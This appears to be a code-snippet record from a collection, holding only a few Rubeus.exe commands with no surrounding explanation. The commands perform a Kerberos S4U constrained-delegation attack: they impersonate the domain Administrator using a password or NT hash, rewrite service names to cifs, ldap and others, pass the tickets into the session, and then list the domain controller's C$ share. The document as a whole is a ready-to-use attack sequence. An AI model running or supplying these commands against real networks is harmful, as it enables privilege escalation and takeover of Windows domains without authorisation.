---
id: c9c5858b-29e2-48b5-8a32-0f7e36d0f0fe
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.695273+00:00'
updated_at: '2023-04-10T20:26:26.275782+00:00'
---

# Code Snippet c9c5858b

**Language**: ps1

```ps1
# with a password
Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"

# with a NT hash
Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
dir \\dc.domain.com\c$
```


